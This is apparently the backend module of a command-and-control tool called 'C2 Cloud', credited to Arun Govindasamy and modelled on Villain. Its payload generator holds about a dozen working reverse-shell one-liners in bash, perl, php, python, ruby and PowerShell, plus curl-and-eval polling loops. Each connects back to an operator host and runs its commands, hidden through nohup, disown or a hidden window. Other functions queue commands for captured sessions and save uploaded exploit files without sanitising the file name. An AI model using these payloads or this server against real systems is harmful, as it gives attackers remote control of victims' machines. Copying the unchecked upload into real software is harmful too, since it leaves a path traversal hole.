# C2 Cloud
#
# Author: Arun Govindasamy
# References: https://github.com/t3l3machus/Villain

import os
import json
from flask import request, redirect, Response, make_response, jsonify, session, render_template
from libs.dbOperations import DBOperations
from libs.redisOperations import RedisOperations
from libs.logger import init_logger
from libs.common import Common

redis_client = RedisOperations()
common = Common()
logger_instance = init_logger('C2_Cloud')

def session_records(session_id):
    if session_id == "all":
        queryString = "*"
    else:
        queryString = session_id
    result = redis_client.get_session_records(queryString)
    logger_instance.info(f"session_records - result: {result}")
    return result

def hc_records(session_id):
    if session_id == "all":
        queryString = "*"
    else:
        queryString = session_id
    result = redis_client.get_hc_records(queryString)
    logger_instance.info(f"hc_records - result: {result}")
    return result

def payload_records(session_id):
    result = redis_client.get_payload_records(session_id)
    logger_instance.info(f"payload_records - result: {result}")
    return result

def payload_generator(host_name, port):
    # payload template 
    session_id = common.generate_random_id()
    # to ensure the generated session id is not in use 
    while True:
        session_key = "session_details_" + session_id
        session_data = redis_client.get_data(session_key)
        if session_data:
            session_id = common.generate_random_id()
        else:
            break
    c2_payload = [
        '''nohup `exec 5<>/dev/tcp/{host_name}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done` &''',
        """perl -e 'use Socket;$i="{host_name}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'""",
        '''nohup php -r '$sock=fsockopen("{host_name}",{port});passthru("bash <&3 >&3 2>&3");' 3<>/dev/tcp/{host_name}/{port} > /dev/null 2>&1 & disown''',
        '''nohup php -r '$sock=fsockopen("{host_name}",{port});popen("bash <&3 >&3 2>&3", "r");' 3<>/dev/tcp/{host_name}/{port} > /dev/null 2>&1 & disown''',
        '''export hname="{host_name}"; export portno={port}; nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("hname"),int(os.getenv("portno"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' > /dev/null 2>&1 & disown''',
        '''nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host_name}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > /dev/null 2>&1 & disown''',
        '''nohup ruby -rsocket -e'exit if fork;c=TCPSocket.new("{host_name}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}' > /dev/null 2>&1 & disown''',
        '''nohup ruby -rsocket -e 'spawn("bash",[:in,:out,:err]=>TCPSocket.new("{host_name}",{port}))' > /dev/null 2>&1 & disown''',
        '''Start-Process $PSHOME\powershell.exe -ArgumentList {$TCPClient = New-Object Net.Sockets.TCPClient('{host_name}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()} -WindowStyle Hidden''',
        '''python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['powershell.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{host_name}',{port}));threading.Thread(target=exec,args=('while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)',globals()),daemon=True).start();threading.Thread(target=exec,args=('while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)',globals())).start()"''',
        '''nohup bash -c 's={host_name}:{port}&&i={session_id}&&hname=$(hostname)&&p=http://;curl -s "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/$i" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r";echo $$;fi; fi; sleep 1; done;' & disown''',
        '''nohup `s={host_name}&&i={session_id}&&hname=$(hostname)&&p=https://;curl -s -k "$p$s/$i/$hname/$USER" -H "Authorization: $i" -o /dev/null 2>/dev/null;while :; do c=$(curl -s -k "$p$s/$i" -H "Authorization: $i" 2>/dev/null);if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/$i -X POST -H "Authorization: $i" -d "c=$c&r=$r" 2>/dev/null; fi; fi; sleep 1; done;` &'''
    ]
    for i in range(len(c2_payload)):
        c2_payload[i] = c2_payload[i].replace('{session_id}', session_id).replace('{host_name}', host_name).replace('{port}', port)
    logger_instance.info(c2_payload)
    logger_instance.info(f"payload_generator - host_name: {host_name}, port: {port}, c2_payload: {c2_payload}")
    c2_payload = json.dumps(c2_payload)
    return c2_payload

def exec_command(session_id, command):
    try:
        dt = common.current_datetime()
        session_key = "session_details_" + session_id
        session_data = redis_client.get_data(session_key)
        payload = {"command": command, "command_date": dt}
        if session_data["session_type"] == "telegram_bot":
            print(f"telegram_bot, payload: {payload}")
            redis_client.publish_message("c2_telegram", json.dumps(payload))
        else:
            session_data["commands"].append(payload)
            logger_instance.info(f"exec_command - session_data: {session_data}")
            redis_client.write_session_data(session_key, session_data)
        return "success"
    except Exception as e:
        logger_instance.info(f"exec_command - error: {e}")
        return "error"

def allrecords():
    logger_instance.info('allrecords')
    records = DBOperations().allRecords("session_details")
    result = {"service": "api", "values": []}
    for record in records:
        result["values"].append(record)
    return str(result)

def list_files():
    logger_instance.info('list_files')
    files_dict = {}
    files_list = []
    directory = "/usr/src/app/src/exploits"
    if os.path.exists(directory):
        for filename in os.listdir(directory):
            if os.path.isfile(os.path.join(directory, filename)):
                files_list.append({"file_name": filename})
    else:
        logger_instance.info("list_files - Directory does not exist")
    print(f"files_list={files_list}")
    
    return files_list

def file_upload():
    if 'file' not in request.files:
        return 'No file part'

    file = request.files['file']

    if file.filename == '':
        return 'No selected file'

    if file:
        file.save(os.path.join('/usr/src/app/src/exploits', file.filename))
        return 'File successfully uploaded'
